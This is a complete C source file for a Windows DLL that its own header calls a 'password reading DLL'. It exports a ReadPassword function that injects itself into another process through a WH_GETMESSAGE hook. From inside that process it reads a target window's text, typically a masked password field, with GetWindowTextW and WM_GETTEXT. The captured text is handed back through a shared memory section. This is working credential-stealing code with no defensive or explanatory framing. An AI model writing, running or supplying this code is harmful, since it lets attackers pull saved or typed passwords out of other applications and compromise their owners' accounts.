/* hook_reader32.c - 32-bit password reading DLL */
#include <windows.h>

static HMODULE g_hModule = NULL;
static HHOOK g_hk = NULL;

#pragma data_seg(".SHARED")
static HWND  g_targetHwnd = NULL;
static WCHAR g_pwd[512] = {0};
static volatile BOOL g_go = FALSE;
static volatile BOOL g_done = FALSE;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.SHARED,RWS")

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && g_go && !g_done && g_targetHwnd && IsWindow(g_targetHwnd)) {
        HWND target = g_targetHwnd;
        
        int len = GetWindowTextW(target, g_pwd, 512);
        if (len <= 0 || g_pwd[0] == 0) {
            LRESULT tl = SendMessageW(target, WM_GETTEXTLENGTH, 0, 0);
            if (tl > 0 && tl < 511) {
                SendMessageW(target, WM_GETTEXT, (WPARAM)(tl + 1), (LPARAM)g_pwd);
            }
        }
        if (g_pwd[0] == 0) {
            SendMessageW(target, WM_GETTEXT, (WPARAM)512, (LPARAM)g_pwd);
        }
        
        g_done = TRUE;
        g_go = FALSE;
    }
    return CallNextHookEx(g_hk, nCode, wParam, lParam);
}

__declspec(dllexport) BOOL __stdcall ReadPassword(HWND hwnd, WCHAR* outBuf, int bufSize) {
    if (!hwnd || !IsWindow(hwnd) || !outBuf || bufSize <= 0)
        return FALSE;
    
    outBuf[0] = 0;
    
    DWORD tid = GetWindowThreadProcessId(hwnd, NULL);
    if (!tid) return FALSE;
    
    g_targetHwnd = hwnd;
    g_go = TRUE;
    g_done = FALSE;
    g_pwd[0] = 0;
    
    g_hk = SetWindowsHookExW(WH_GETMESSAGE, HookProc, g_hModule, tid);
    if (!g_hk) return FALSE;
    
    PostThreadMessageW(tid, WM_NULL, 0, 0);
    PostMessageW(hwnd, WM_NULL, 0, 0);
    
    int waited = 0;
    while (!g_done && waited < 3000) {
        Sleep(10);
        waited += 10;
    }
    
    BOOL ret = FALSE;
    if (g_done && g_pwd[0] != 0) {
        wcsncpy(outBuf, g_pwd, bufSize - 1);
        outBuf[bufSize - 1] = 0;
        ret = TRUE;
    }
    
    if (g_hk) { UnhookWindowsHookEx(g_hk); g_hk = NULL; }
    return ret;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        g_hModule = h;
        DisableThreadLibraryCalls(h);
    }
    return TRUE;
}
